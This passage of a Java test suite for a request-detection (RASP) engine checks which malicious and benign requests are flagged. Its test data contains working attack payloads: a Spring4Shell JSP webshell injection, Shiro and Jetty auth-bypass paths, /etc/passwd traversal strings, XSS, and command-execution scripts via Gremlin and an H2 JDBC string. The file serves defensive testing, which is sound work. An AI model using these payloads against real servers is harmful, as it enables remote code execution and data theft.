                    "{\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"value\":\"ok\"}}],\"uri\":\"http://example.com\"}")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresDynamicScriptConfigOutsideConfigShape() {
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of("message", List.of("#{T(java.lang.Runtime).getRuntime().exec('id')}")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsInternalForwardToSensitiveControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/hax",
            "jsp=/app/rest/users;.jsp",
            Map.of("jsp", List.of("/app/rest/users;.jsp")),
            Map.of("user-agent", "Mozilla/5.0"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_internal_forward");
    assertEquals("jsp", result.orElseThrow().details().get("parameter"));
  }

  @Test
  void detectsEncodedInternalForwardToSensitiveControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/hax",
            "jsp=%2Fapp%2Frest%2Fusers%3B.jsp",
            Map.of("jsp", List.of("%2Fapp%2Frest%2Fusers%3B.jsp")),
            Map.of("user-agent", "Mozilla/5.0"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_internal_forward");
  }

  @Test
  void ignoresInternalForwardWithoutServletSuffixConfusion() {
    var context =
        new RequestContext(
            "GET",
            "/hax",
            "jsp=/app/rest/users",
            Map.of("jsp", List.of("/app/rest/users")),
            Map.of("user-agent", "Mozilla/5.0"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresOrdinaryInternalJspForward() {
    var context =
        new RequestContext(
            "GET",
            "/dashboard",
            "jsp=/WEB-INF/jsp/help;.jsp",
            Map.of("jsp", List.of("/WEB-INF/jsp/help;.jsp")),
            Map.of("user-agent", "Mozilla/5.0"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresSensitiveForwardTargetInNonForwardParameter() {
    var context =
        new RequestContext(
            "GET",
            "/search",
            "q=/app/rest/users;.jsp",
            Map.of("q", List.of("/app/rest/users;.jsp")),
            Map.of("user-agent", "Mozilla/5.0"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsXssRequestInput() {
    var result = engine.detectRequest(request(Map.of("q", List.of("<script>alert(1)</script>"))));

    assertTrue(result.isPresent());
    assertEquals("xss_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsXssRequestInputEventHandlerAttributeInjection() {
    // Attribute-injection XSS carries no full tag, only an event handler.
    var result =
        engine.detectRequest(request(Map.of("name", List.of("\" onerror=alert(1) x=\""))));

    assertTrue(result.isPresent());
    assertEquals("xss_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void ignoresBenignHtmlMarkupInRequestParameters() {
    // Legitimate HTML-bearing input (comments, rich text, markup, search terms)
    // must not trip xss_userinput — it is not an XSS execution vector.
    for (String benign :
        List.of(
            "I love <b>bold</b> and <i>italic</i> text",
            "<p>Hello world</p>",
            "<div class=\"card\"><a href=\"/home\">home</a></div>",
            "<html><body><h1>Title</h1></body></html>",
            "online=true&onboarding=1")) {
      var result = engine.detectRequest(request(Map.of("comment", List.of(benign))));
      assertTrue(
          result.isEmpty() || !"xss_userinput".equals(result.orElseThrow().algorithm()),
          "benign markup should not trip xss_userinput: " + benign);
    }
  }

  @Test
  void detectsJavaBeanClassLoaderPollutionParameter() {
    var result =
        engine.detectRequest(
            request(
                Map.of(
                    "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
                    List.of("%{c2}i"))));

    assertAlgorithm(result, "request_java_bean_pollution");
  }

  @Test
  void detectsSpringCve202222965TomcatAccessLogValveBindingAndRedactsPayload() {
    String parameter =
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
    String payload =
        "%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))) { "
            + "java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } %{suffix}i";
    String query =
        parameter
            + "=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))"
            + "%7Bjava.lang.Runtime.getRuntime().exec(request.getParameter(%22cmd%22));%7D"
            + "%25%7Bsuffix%7Di"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
            + "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";
    var parameters = new LinkedHashMap<String, List<String>>();
    parameters.put(parameter, List.of(payload));
    parameters.put(
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix",
        List.of(".jsp"));
    parameters.put(
        "class.module.classLoader.resources.context.parent.pipeline.first.directory",
        List.of("webapps/ROOT"));
    parameters.put(
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix",
        List.of("tomcatwar"));
    parameters.put(
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat",
        List.of(""));
    var context =
        new RequestContext(
            "GET",
            "/",
            query,
            parameters,
            Map.of("user-agent", "JUnit", "suffix", "%>//", "c1", "Runtime", "c2", "<%"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_java_bean_pollution");
    var detection = result.orElseThrow();
    assertEquals(parameter, detection.details().get("parameter"));
    assertEquals("[redacted]", detection.request().parameters().get(parameter).get(0));
    assertFalse(detection.request().query().contains("getRuntime"));
    assertFalse(detection.request().query().contains("tomcatwar"));
  }

  @Test
  void detectsBracketedJavaBeanClassLoaderPollutionParameter() {
    var result =
        engine.detectRequest(
            request(
                Map.of(
                    "class[module][classLoader][resources][context][parent][pipeline][first][suffix]",
                    List.of(".jsp"))));

    assertAlgorithm(result, "request_java_bean_pollution");
  }

  @Test
  void ignoresOrdinaryClassRequestParameters() {
    var result =
        engine.detectRequest(
            request(
                Map.of(
                    "className", List.of("com.example.Widget"),
                    "module", List.of("catalog"),
                    "classLoaderName", List.of("app"))));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRawPathTraversalAuthBypassShape() {
    var result = engine.detectRequest(requestUri("/geo/../dataease/de2api/datasource/types"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsPathParameterTraversalAuthBypassShape() {
    var result = engine.detectRequest(requestUri("/public/..;/admin/"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsShiroCve20201957SemicolonTraversalAuthBypassShape() {
    var result = engine.detectRequest(requestUri("/xxx/..;/admin/"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsDotSegmentAuthBypassShape() {
    var result = engine.detectRequest(requestUri("/./admin"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals("/admin", result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsShiroCve20103863DotSegmentAuthBypassShape() {
    var result = engine.detectRequest(requestUri("/./admin"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals("/admin", result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsDuplicateSlashAuthBypassShape() {
    var result = engine.detectRequest(requestUri("//admin"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals("/admin", result.orElseThrow().details().get("decoded"));
  }

  @Test
  void ignoresDotSegmentOnOrdinaryStaticPath() {
    var result = engine.detectRequest(requestUri("/assets/./logo.png"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresCanonicalSensitiveControlPathWithoutConfusion() {
    var result = engine.detectRequest(requestUri("/admin"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsEncodedPathTraversalAuthBypassShape() {
    var result = engine.detectRequest(requestUri("/%2F%2F..%2F..%2Fetc%2Fpasswd"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsNexusCve20244956EncodedSlashPathTraversalShape() {
    var uri =
        "/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd";

    var result = engine.detectRequest(requestUri(uri));

    assertAlgorithm(result, "request_path_confusion");
    assertTrue(result.orElseThrow().details().get("decoded").contains("/../"));
  }

  @Test
  void detectsFlinkDoubleEncodedLogPathTraversalShape() {
    var uri =
        "/jobmanager/logs/"
            + "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd";

    var result = engine.detectRequest(requestUri(uri));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals(
        "/jobmanager/logs/../../../../../../../../etc/passwd",
        result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsElasticsearchCve20153337PluginPathTraversalShape() {
    var result =
        engine.detectRequest(requestUri("/_plugin/head/../../../../../../../../../etc/passwd"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals(
        "/_plugin/head/../../../../../../../../../etc/passwd",
        result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsElasticsearchCve20155531SnapshotEncodedPathTraversalShape() {
    var uri = "/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd";

    var result = engine.detectRequest(requestUri(uri));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals(
        "/_snapshot/test/backdata/../../../../../../../etc/passwd",
        result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsEncodedControlCharacterOnSensitivePath() {
    var result = engine.detectRequest(requestUri("/admin/%0atest"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals("/admin/\ntest", result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsEncodedCarriageReturnOnSensitivePath() {
    var result = engine.detectRequest(requestUri("/admin/%0dtest"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals("/admin/\rtest", result.orElseThrow().details().get("decoded"));
  }

  @Test
  void ignoresEncodedControlCharacterOnOrdinaryPath() {
    var result = engine.detectRequest(requestUri("/assets/%0abanner.png"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsUnicodeGhostBitsPathTraversalShape() {
    var result = engine.detectRequest(requestUri("/阮严灵丰丰甲来/etc/passw%64"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsSpringJettyGhostBitsPathTraversalShape() {
    var result =
        engine.detectRequest(
            requestUri("/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64"));

    assertAlgorithm(result, "request_path_confusion");
    assertTrue(result.orElseThrow().details().get("decoded").contains("/../"));
  }

  @Test
  void detectsSpringCve202541242VulhubGhostBitsTraversalShape() {
    var result =
        engine.detectRequest(
            requestUri(
                "/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64"));

    assertAlgorithm(result, "request_path_confusion");
    assertTrue(result.orElseThrow().details().get("decoded").contains("/../"));
  }

  @Test
  void detectsJettyLenientHexPathTraversalShape() {
    var result =
        engine.detectRequest(requestUri("/setup/setup-s/%2>%2>/%2>%2>/user-create.jsp"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsOpenfireUnicodeEscapedSetupTraversalShape() {
    var result =
        engine.detectRequest(
            requestUri("/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp"));

    assertAlgorithm(result, "request_path_confusion");
    assertEquals(
        "/setup/setup-s/../../user-create.jsp", result.orElseThrow().details().get("decoded"));
  }

  @Test
  void detectsDoubleEncodedJettyLenientHexPathTraversalShape() {
    var result = engine.detectRequest(requestUri("/setup/setup-s/%252>%252>/admin.jsp"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsOverlongUtf8PathTraversalShape() {
    var result =
        engine.detectRequest(
            requestUri(
                "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsThreeByteOverlongUtf8PathTraversalShape() {
    var result = engine.detectRequest(requestUri("/theme/%e0%80%ae%e0%80%ae/admin"));

    assertAlgorithm(result, "request_path_confusion");
  }

  @Test
  void detectsJettyConcatDoubleDecodedProtectedResourceQuery() {
    var result = engine.detectRequest(requestTarget("GET", "/static", "/%2557EB-INF/web.xml"));

    assertAlgorithm(result, "request_internal_resource");
    assertEquals("query", result.orElseThrow().details().get("component"));
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("double-decoded", result.orElseThrow().details().get("variant"));
  }

  @Test
  void detectsJettyEncodedDotProtectedResourcePath() {
    var result = engine.detectRequest(requestUri("/%2e/WEB-INF/web.xml"));

    assertAlgorithm(result, "request_internal_resource");
    assertEquals("uri", result.orElseThrow().details().get("component"));
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("decoded", result.orElseThrow().details().get("variant"));
  }

  @Test
  void detectsJettyUnicodeDotProtectedResourcePath() {
    var result = engine.detectRequest(requestUri("/%u002e/WEB-INF/web.xml"));

    assertAlgorithm(result, "request_internal_resource");
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("unicode-decoded", result.orElseThrow().details().get("variant"));
  }

  @Test
  void detectsJettyNulDotProtectedResourcePath() {
    var result = engine.detectRequest(requestUri("/.%00/WEB-INF/web.xml"));

    assertAlgorithm(result, "request_internal_resource");
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("nul-segment", result.orElseThrow().details().get("variant"));
  }

  @Test
  void detectsJettyNulDotDotProtectedResourcePath() {
    var result = engine.detectRequest(requestUri("/a/b/..%00/WEB-INF/web.xml"));

    assertAlgorithm(result, "request_internal_resource");
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("nul-segment", result.orElseThrow().details().get("variant"));
  }

  @Test
  void detectsEncodedProtectedResourcePath() {
    var result = engine.detectRequest(requestUri("/%57EB-INF/web.xml"));

    assertAlgorithm(result, "request_internal_resource");
  }

  @Test
  void ignoresDirectProtectedResourcePath() {
    var result = engine.detectRequest(requestUri("/WEB-INF/web.xml"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignDoubleEncodedQueryResource() {
    var result = engine.detectRequest(requestTarget("GET", "/static", "/css/%2562ase.css"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresEncodedProtectedResourceInsideOrdinaryQueryParameter() {
    var result = engine.detectRequest(requestTarget("GET", "/search", "uri=%2fMETA-INF%2fMANIFEST.MF"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignEncodedRequestPath() {
    var result = engine.detectRequest(requestUri("/files/report%202026.txt"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignJettyLenientHexPath() {
    var result = engine.detectRequest(requestUri("/files/%2>report.txt"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignOverlongUtf8PathSeparator() {
    var result = engine.detectRequest(requestUri("/assets%c0%afimages/logo.png"));

    assertTrue(result.isEmpty());
  }

  private static RequestContext request() {
    return request(Map.of());
  }

  private static RequestContext request(Map<String, List<String>> parameters) {
    return new RequestContext(
        "GET", "/rasp/test", "", parameters, Map.of("user-agent", "JUnit"));
  }

  private static RequestContext requestUri(String uri) {
    return new RequestContext("GET", uri, "", Map.of(), Map.of("user-agent", "JUnit"));
  }

  private static RequestContext requestTarget(String method, String uri, String query) {
    return new RequestContext(method, uri, query, Map.of(), Map.of("user-agent", "JUnit"));
  }

  private static String hugeGraphGremlinScript() {
    return "Thread thread = Thread.currentThread();"
        + "Class clz = Class.forName(\"java.lang.Thread\");"
        + "java.lang.reflect.Field field = clz.getDeclaredField(\"name\");"
        + "field.setAccessible(true);"
        + "field.set(thread, \"SL7\");"
        + "Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");"
        + "java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);"
        + "java.util.List command = java.util.Arrays.asList(\"id\");"
        + "Object processBuilderInstance = constructor.newInstance(command);"
        + "java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");"
        + "org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());";
  }

  private static String jsonString(String value) {
    return value.replace("\\", "\\\\").replace("\"", "\\\"");
  }

  private static String dataEaseH2Configuration() {
    var jdbc =
        "jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec()"
            + " throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\","
            + "\"/tmp/pwned\"})\\; }$$\\;CALL EXEC()";
    return "{\"jdbc\":\""
        + jsonString(jdbc)
        + "\",\"username\":\"\",\"password\":\"\",\"driver\":\"org.h2.Driver\"}";
  }

  private static String basic(String username, String password) {
    return "Basic "
        + Base64.getEncoder().encodeToString((username + ":" + password).getBytes(StandardCharsets.UTF_8));
  }

  private static String forgedJwt() {
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        + "eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoyMDAwMDAwMDAwfQ."
        + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  }

  private static List<String> rmiRegistryStack() {
    return List.of(
        "sun.rmi.registry.RegistryImpl",
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport");
  }

  private static List<String> tomcatTribesStack() {
    return List.of(
        "org.apache.catalina.tribes.group.interceptors.EncryptInterceptor",
        "org.apache.catalina.tribes.io.XByteBuffer",
        "org.apache.catalina.tribes.transport.nio.NioReplicationTask");
  }

  private static List<String> log4jSocketServerStack() {
    return List.of(
        "org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge",
        "org.apache.logging.log4j.core.net.server.TcpSocketServer",
        "org.apache.logging.log4j.core.net.server.AbstractSocketServer");
  }

  private static List<String> casWebflowStateStack() {
    return List.of(
        "org.jasig.cas.util.EncryptedTranscoder",
        "org.springframework.webflow.execution.repository.support.ClientFlowExecutionRepository",
        "org.springframework.webflow.execution.repository.snapshot.SerializedFlowExecutionSnapshot",
        "java.io.ObjectInputStream");
  }

  private static List<String> rmiTransportStack() {
    return List.of(
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport",
        "org.apache.jmeter.engine.RemoteJMeterEngineImpl");
  }

  private static List<String> neo4jShellRmiStack() {
    return List.of(
        "org.neo4j.shell.impl.ShellServerImpl",
        "org.neo4j.shell.ShellServer",
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport",
        "java.io.ObjectInputStream");
  }

  private static List<String> weblogicT3Stack() {
    return List.of(
        "weblogic.rjvm.InboundMsgAbbrev",
        "weblogic.rjvm.MsgAbbrevInputStream",
        "weblogic.protocol.ServerChannelInputStream",
        "weblogic.socket.SocketMuxer");
  }

  private static List<String> weblogicIiopStack() {
    return List.of(
        "weblogic.iiop.IIOPInputStream",
        "weblogic.iiop.ServerIIOPConnection",
        "weblogic.rmi.internal.BasicServerRef");
  }

  private static List<String> activeMqJmsObjectMessageStack() {
    return List.of(
        "org.apache.activemq.command.ActiveMQObjectMessage",
        "org.apache.activemq.util.ClassLoadingAwareObjectInputStream",
        "java.io.ObjectInputStream",
        "org.apache.activemq.web.MessageServletSupport");
  }

  private static List<String> jenkinsCliSignedObjectStack() {
    return List.of(
        "hudson.cli.CLICommand",
        "hudson.cli.CliManagerImpl",
        "hudson.remoting.ObjectInputStreamEx",
        "java.io.ObjectInputStream");
  }

  private static List<String> xmlDecoderStack() {
    return List.of(
        "io.ohmyrasp.agent.hook.OhMyRaspHooks",
        "java.beans.Expression",
        "com.sun.beans.decoder.ObjectElementHandler",
        "java.beans.XMLDecoder");
  }

  private static void assertAlgorithm(Optional<Detection> result, String algorithm) {
    assertTrue(result.isPresent());
    assertEquals(algorithm, result.orElseThrow().algorithm());
  }
}
